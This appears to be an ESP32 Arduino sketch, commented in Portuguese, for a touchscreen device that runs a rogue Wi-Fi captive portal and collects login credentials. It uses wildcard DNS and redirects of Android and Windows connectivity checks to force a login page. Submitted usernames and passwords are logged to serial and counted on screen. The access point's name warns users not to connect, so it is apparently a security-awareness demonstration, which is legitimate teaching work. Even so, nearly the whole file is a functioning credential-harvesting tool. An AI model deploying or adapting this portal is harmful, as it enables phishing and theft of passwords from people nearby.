#include <SPI.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <XPT2046_Touchscreen.h>
#include <TFT_eSPI.h>
#include "logo_unip.h"

#define XPT2046_IRQ 36
#define XPT2046_MOSI 32
#define XPT2046_MISO 39
#define XPT2046_CLK 25
#define XPT2046_CS 33

SPIClass spiToque = SPIClass(VSPI);
XPT2046_Touchscreen toque(XPT2046_CS, XPT2046_IRQ);

TFT_eSPI tela = TFT_eSPI();

const char *SSID_PORTAL = "REDE_INSEGURA_NAO_CONECTE";   // nome do ponto de acesso; o proprio SSID e o aviso
const byte PORTA_DNS = 53;
DNSServer servidorDns;
WebServer  servidorWeb(80);

// Telas e paginas HTML (showIntro, loginPageHtml, showPortalStatus, etc.)
// ficam em visual.ino; este arquivo so cuida de rede/HTTP/toque.
extern bool portalMostrandoCaptura;  // definida em visual.ino

enum ModoApp { MODO_INTRO, MODO_PORTAL };
ModoApp modoAtual = MODO_INTRO;

int    contadorCapturas = 0;
String ultimoUsuario = "";
String ultimaSenha = "";

void setup() {
  Serial.begin(115200);

  spiToque.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
  toque.begin(spiToque);
  toque.setRotation(1);

  tela.init();
  tela.setRotation(1);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  showIntro();
  modoAtual = MODO_INTRO;
}

void handleRoot() {
  servidorWeb.send(200, "text/html", loginPageHtml());
}
void handleLogo() {
  servidorWeb.send_P(200, "image/png",
                (PGM_P)Screenshot_from_2026_10_21_17_15_40_png,
                Screenshot_from_2026_10_21_17_15_40_png_len);
}
void handleCaptiveRedirect() {
  servidorWeb.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
  servidorWeb.send(302, "text/plain", "");
}

void handleLogin() {
  ultimoUsuario = servidorWeb.arg("user");
  ultimaSenha = servidorWeb.arg("pass");
  contadorCapturas++;

  Serial.printf("[PORTAL] #%d user='%s' pass='%s'\n",
                contadorCapturas, ultimoUsuario.c_str(), ultimaSenha.c_str());

  showPortalCapture();
  servidorWeb.send(200, "text/html", resultPageHtml(ultimoUsuario));
}

void startPortalMode() {
  modoAtual = MODO_PORTAL;

  WiFi.mode(WIFI_AP);
  WiFi.softAP(SSID_PORTAL);
  IPAddress ip = WiFi.softAPIP();

  servidorDns.start(PORTA_DNS, "*", ip);       // resolve qualquer dominio pra nos mesmo

  servidorWeb.on("/", handleRoot);
  servidorWeb.on("/login", HTTP_POST, handleLogin);
  servidorWeb.on("/logo.png", HTTP_GET, handleLogo);

  // Checagens de conectividade do Android (varia por fabricante/versao).
  servidorWeb.on("/generate_204", handleCaptiveRedirect);
  servidorWeb.on("/gen_204", handleCaptiveRedirect);
  // Checagens de conectividade do Windows.
  servidorWeb.on("/ncsi.txt", handleCaptiveRedirect);
  servidorWeb.on("/connecttest.txt", handleCaptiveRedirect);
  servidorWeb.on("/fwlink", handleCaptiveRedirect);

  servidorWeb.onNotFound(handleRoot);            // dispara o popup de portal cativo (iOS etc.)
  servidorWeb.begin();

  Serial.printf("[PORTAL] AP '%s' up at %s\n", SSID_PORTAL, ip.toString().c_str());
  showPortalStatus(ip);
}

void printTouchToSerial(TS_Point p) {
  Serial.print("Pressure = ");
  Serial.print(p.z);
  Serial.print(", x = ");
  Serial.print(p.x);
  Serial.print(", y = ");
  Serial.print(p.y);
  Serial.println();
}

void loop() {
  if (modoAtual == MODO_PORTAL) {
    servidorDns.processNextRequest();
    servidorWeb.handleClient();

    // Blink sem bloquear: o ponto ao vivo sempre, o cursor do terminal so na
    // tela de status (a tela de captura nao tem cursor pra redesenhar).
    static unsigned long ultimoPiscarMs = 0;
    static bool piscando = true;
    if (millis() - ultimoPiscarMs > 500) {
      ultimoPiscarMs = millis();
      piscando = !piscando;
      setLiveDot(piscando);
      if (!portalMostrandoCaptura) setCursorBlock(piscando);
    }
  }

  static bool estavaTocado = false;
  bool agoraTocado = toque.tirqTouched() && toque.touched();

  if (agoraTocado && !estavaTocado) {
    TS_Point p = toque.getPoint();
    printTouchToSerial(p);
    if (modoAtual == MODO_INTRO) {
      startPortalMode();
    } else if (modoAtual == MODO_PORTAL && portalMostrandoCaptura) {
      // Botao "Voltar" na tela de captura: volta pra tela de espera,
      // que redesenha com o contador de capturas atualizado.
      showPortalStatus(WiFi.softAPIP());
    }
  }
  estavaTocado = agoraTocado;
}
